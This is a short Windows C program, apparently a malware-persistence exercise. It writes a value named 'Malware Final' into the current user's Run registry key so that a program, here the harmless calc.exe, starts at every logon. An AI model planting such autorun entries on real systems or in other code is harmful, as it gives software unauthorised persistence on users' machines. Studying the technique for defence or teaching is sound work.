#pragma comment(lib, "advapi32.lib")

#include <windows.h>
#include <stdio.h>

char szRunKey[] = {"Software\\Microsoft\\Windows\\CurrentVersion\\Run"};
char szMyAppPath[] = {"C:\\Windows\\system32\\calc.exe"};
char szMyappSubKey[] = {"Malware Final"};

int main(void){

	HKEY hKey;
	DWORD dwDisposition, dwType, dwSize;
	
	//write to HKCU
	if (RegCreateKeyEx(HKEY_CURRENT_USER, szRunKey, 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS)
	{
		dwType = REG_SZ;
		dwSize = strlen(szMyAppPath);
		
		if (RegSetValueEx(hKey, szMyappSubKey, 0, dwType, (const unsigned char*)szMyAppPath, sizeof(szMyAppPath)) == ERROR_SUCCESS)
		{
			RegCloseKey(hKey);
		}

	}

	return 0;
}


